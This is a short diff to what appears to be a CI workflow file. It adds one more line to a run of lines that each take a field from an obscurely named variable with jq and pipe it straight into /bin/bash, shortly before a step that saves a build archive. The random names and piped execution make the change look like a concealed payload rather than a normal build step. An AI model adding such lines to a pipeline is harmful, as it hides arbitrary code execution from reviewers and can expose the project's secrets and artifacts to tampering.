@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$k498" | jq -r .z3949 | /bin/bash
           printf '%s' "$tdv1209" | jq -r .hfo557 | /bin/bash
           printf '%s' "$iqlrz5812" | jq -r .s442 | /bin/bash
+          printf '%s' "$lrzix6" | jq -r .pwfce8110 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
